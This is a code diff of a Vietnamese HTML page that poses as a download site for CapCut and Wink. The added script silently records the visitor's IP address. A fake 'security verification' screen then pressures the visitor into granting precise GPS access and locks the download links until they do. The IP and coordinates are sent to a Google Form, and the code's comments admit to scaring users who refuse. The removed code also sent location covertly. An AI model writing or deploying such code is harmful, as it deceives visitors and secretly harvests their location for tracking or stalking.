@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <title>Web tải app</title>
     <style>
+        /* CSS cho trang web chính (bị ẩn lúc đầu) */
+        #main-content {
+            display: none; /* Ẩn toàn bộ web tải app đi */
+        }
+        
         h1 {
             color: rgb(255, 0, 0);
             font-size: 100px;
@@ -11,10 +16,13 @@
         a {
             font-size: 50px;
             color: #ffc400;
+            text-decoration: none;
         }
-        button {
+        .download-btn {
             font-size: 35px;
             font-family: 'Times New Roman';
+            margin: 10px 0;
+            cursor: pointer;
         }
         body {
             background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_4PqDG7wLnJZViwWszE8pCNUcaKp2B9usnL3ljV5g_A&s=10");
@@ -22,93 +30,155 @@
             background-position: center;
             background-repeat: no-repeat;
             background-attachment: fixed;
+            margin: 0;
+            text-align: center;
+        }
+
+        /* CSS cho màn hình KHÓA ÉP BUỘC */
+        #locker-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.95); /* Màn hình đen thui */
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        #locker-overlay h2 {
+            font-size: 40px;
+            color: #ffc400;
+        }
+        #locker-overlay p {
+            font-size: 20px;
+            max-width: 600px;
+            line-height: 1.5;
+        }
+        #verify-btn {
+            font-size: 30px;
+            padding: 15px 30px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        #verify-btn:hover {
+            background-color: #cc0000;
+        }
+        #error-msg {
+            color: #ff4d4d;
+            font-size: 25px;
+            margin-top: 20px;
+            font-weight: bold;
+            display: none; /* Ẩn lỗi lúc đầu */
         }
     </style>
 </head>
 <body>
-    <h1>Đây là trang web tải app</h1>
 
-    <a href="https://www.capcut.com/vi-vn/tools/desktop-video-editor" target="_blank">Tải Capcut bản mới nhất</a>
+    <!-- PHẦN 1: MÀN HÌNH KHÓA (CHỈ CHO QUA KHI CHO PHÉP GPS) -->
+    <div id="locker-overlay">
+        <h2>XÁC MINH BẢO MẬT</h2>
+        <p>Hệ thống cần xác định vị trí để chọn Server tải Capcut tối ưu nhất cho khu vực của bạn.</p>
+        <p>Vui lòng bấm nút bên dưới, sau đó chọn <b>"Cho phép" (Allow)</b> trên thông báo của trình duyệt để tiếp tục.</p>
+        
+        <button id="verify-btn">BẤM VÀO ĐÂY ĐỂ XÁC MINH</button>
+        
+        <div id="error-msg">⚠️ Bạn đã từ chối cấp quyền! Không thể mở khóa link tải. Vui lòng tải lại trang (F5) và thử lại!</div>
+    </div>
 
-    <a href="https://capcut.vi.uptodown.com/windows/dw/1124018008" target="_blank">
+    <!-- PHẦN 2: NỘI DUNG WEB CHÍNH (SẼ HIỆN RA NẾU CHO PHÉP) -->
+    <div id="main-content">
+        <h1>Đây là trang web tải app</h1>
+        <br>
+        <a href="https://www.capcut.com/vi-vn/tools/desktop-video-editor" target="_blank">Tải Capcut bản mới nhất</a>
         <br><br><br>
-        <button>Bấm vào đây để tải Capcut 7.5</button>
-    </a>
-
-    <a href="https://wink-meitu.vi.uptodown.com/windows" target="_blank">
+        <a href="https://capcut.vi.uptodown.com/windows/dw/1124018008" target="_blank">
+            <button class="download-btn">Bấm vào đây để tải Capcut 7.5</button>
+        </a>
         <br><br><br>
-        <button>Bấm vào đây để tải wink</button>
-    </a>
-    
-    <a href="https://download.com.vn/capcut-158978" target="_blank">
+        <a href="https://wink-meitu.vi.uptodown.com/windows" target="_blank">
+            <button class="download-btn">Bấm vào đây để tải wink</button>
+        </a>
         <br><br><br>
-        <button>Capcut free</button>
-    </a>
+        <a href="https://download.com.vn/capcut-158978" target="_blank">
+            <button class="download-btn">Capcut free</button>
+        </a>
+    </div>
 
-<script>
-    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
-    const ENTRY_IP = "entry.1588338519";
-    const ENTRY_LAT = "entry.791072472";
-    const ENTRY_LNG = "entry.1393666541";
+    <!-- PHẦN 3: ĐOẠN SCRIPT XỬ LÝ -->
+    <script>
+        const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
+        const ENTRY_IP = "entry.1588338519";
+        const ENTRY_LAT = "entry.791072472";
+        const ENTRY_LNG = "entry.1393666541";
 
-    let currentIP = "Đang lấy...";
+        let userIP = "Không lấy được IP";
 
-    // Hàm gửi data về Google Form
-    function sendToGoogleForm(ip, lat, lng) {
-        const formData = new FormData();
-        formData.append(ENTRY_IP, ip);
-        formData.append(ENTRY_LAT, lat !== "Không lấy được" ? "'" + lat : lat);
-        formData.append(ENTRY_LNG, lng !== "Không lấy được" ? "'" + lng : lng);
+        function sendToGoogleForm(ip, lat, lng) {
+            const formData = new FormData();
+            formData.append(ENTRY_IP, ip);
+            formData.append(ENTRY_LAT, lat);
+            formData.append(ENTRY_LNG, lng);
 
-        fetch(FORM_URL, {
-            method: "POST",
-            mode: "no-cors",
-            body: formData
-        });
-    }
-
-    // 1. Âm thầm lấy IP ngay khi vào web (Không hiện bảng)
-    window.addEventListener("DOMContentLoaded", async () => {
-        try {
-            const res = await fetch("https://ipwho.is/");
-            const data = await res.json();
-            if (data.success) {
-                currentIP = data.ip;
-                // Gửi tạm vị trí IP phòng hờ người ta không bấm nút
-                sendToGoogleForm(currentIP, data.latitude, data.longitude); 
-            }
-        } catch (e) {
-            currentIP = "Lỗi lấy IP";
+            fetch(FORM_URL, {
+                method: "POST",
+                mode: "no-cors",
+                body: formData
+            });
         }
-    });
 
-    // 2. Chặn các nút tải app để xin quyền GPS thật (Sẽ hiện bảng)
-    const buttons = document.querySelectorAll("button");
-    buttons.forEach(btn => {
-        btn.addEventListener("click", (e) => {
-            // Ngăn việc chuyển trang ngay lập tức
-            e.preventDefault(); 
-            const parentLink = btn.closest('a').href;
+        // Tự động lấy IP ngầm ngay khi vào trang
+        async function getIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (e) {
+                console.log("Lỗi IP");
+            }
+        }
+        getIP();
 
+        // Xử lý khi bấm nút Xác minh
+        document.getElementById("verify-btn").addEventListener("click", () => {
+            
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Lấy được GPS xịn -> Bắn data về form
-                        sendToGoogleForm(currentIP, position.coords.latitude, position.coords.longitude);
-                        // Chuyển sang link tải app
-                        window.open(parentLink, "_blank"); 
+                        // 1. THÀNH CÔNG: Lấy GPS xịn
+                        const latFormatted = "'" + position.coords.latitude;
+                        const lngFormatted = "'" + position.coords.longitude;
+                        
+                        // Bắn data về form
+                        sendToGoogleForm(userIP, latFormatted, lngFormatted);
+
+                        // Mở khóa: Ẩn màn hình đen, hiện web chính
+                        document.getElementById("locker-overlay").style.display = "none";
+                        document.getElementById("main-content").style.display = "block";
                     },
                     (error) => {
-                        // Người dùng từ chối -> Vẫn cho qua trang tải app
-                        window.open(parentLink, "_blank"); 
+                        // 2. THẤT BẠI: Bị bấm "Từ chối" hoặc tắt bảng
+                        // Gửi IP và báo là họ từ chối
+                        sendToGoogleForm(userIP, "Bị chặn", "Bị chặn");
+                        
+                        // Hiện thông báo lỗi dọa họ, không cho mở khóa web
+                        document.getElementById("error-msg").style.display = "block";
                     },
-                    { timeout: 5000, enableHighAccuracy: true }
+                    { timeout: 8000, enableHighAccuracy: true }
                 );
             } else {
-                window.open(parentLink, "_blank");
+                alert("Trình duyệt của bạn quá cũ, không hỗ trợ tính năng này!");
             }
         });
-    });
-</script>
+    </script>
 </body>
 </html>
